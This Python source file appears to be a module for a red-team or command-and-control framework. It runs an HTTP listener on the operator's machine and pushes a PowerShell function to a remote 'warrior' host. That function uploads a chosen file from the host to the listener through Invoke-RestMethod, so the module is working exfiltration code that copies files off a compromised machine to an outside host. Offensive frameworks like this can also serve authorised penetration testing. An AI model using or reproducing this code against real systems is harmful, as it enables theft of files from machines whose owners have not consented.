from termcolor import colored, cprint
from module import Module
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from time import sleep



END_DATA = False
MY_FILE = b""


class GetFile(BaseHTTPRequestHandler): 
    # To avoid logs in our screen
    def log_message(self, format, *args):
        return
        
    def _set_response(self): 
        self.send_response(200) 
        self.send_header('Content-type', 'application/json') 
        self.end_headers() 

    def do_GET(self): 
        self._set_response()
        self.wfile.write(''.encode('utf-8'))

    def do_POST(self): 
        global END_DATA, MY_FILE
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        self._set_response()
        self.wfile.write(''.encode('utf-8'))
        if data == b"results=TheEnd":
            END_DATA = True
            return

        MY_FILE += data

    def do_HEAD(self): 
        self._set_headers() 


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "download-file",
                       "Description": "Download a file",
                       "Author": "@josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "source": [None, "Source file to be transferred", True],
                    "ip": [None, "Local IP", True],
                    "port": ["9999", "Listener port", True],
                   "interface": ["0.0.0.0", "Listener address", True],
                   "file": ["/tmp/", "Path to save the file", True] }

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        global END_DATA, MY_FILE
        cprint("If you get an error use CTRL+C", "yellow")
        function = """function download-file {
                    param(
                            [Parameter(Mandatory)]
                            [string] $source,
                            [Parameter(Mandatory)]
                            [string] $uri
                        )
                            Invoke-RestMethod -Uri $uri -Method Post -InFile $source
                            iwr -UseBasicParsing -Method POST -Uri $uri -Body @{results='TheEnd'}
                            return "Done"
                    }
            """


        function += 'download-file -source ' + self.args["source"] + ' -uri http://' + self.args["ip"] + ':'+ self.args["port"]
        listener = Thread(target=self.run, kwargs={'address':self.args["interface"], 'port':int(self.args["port"])})
        listener.start()
        super(CustomModule, self).run(function)
        while not END_DATA:
            pass
        
        path = self.args["file"]
        source = self.args["source"]
        if "\\" in source:
            name = source.split("\\")[-1]
        else:
            name = source.split("/")[-1]

        f = open(path+name, "wb")
        f.write(MY_FILE)
        f.close()
        END_DATA = False
        MY_FILE = b""
        sleep(1)

    
    def run(self, server_class=HTTPServer, handler_class=GetFile, address=None, port=9999):
        try: 
            server_address = (address, port)
            httpd = server_class(server_address, handler_class)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
            httpd.server_close()
        except:
            pass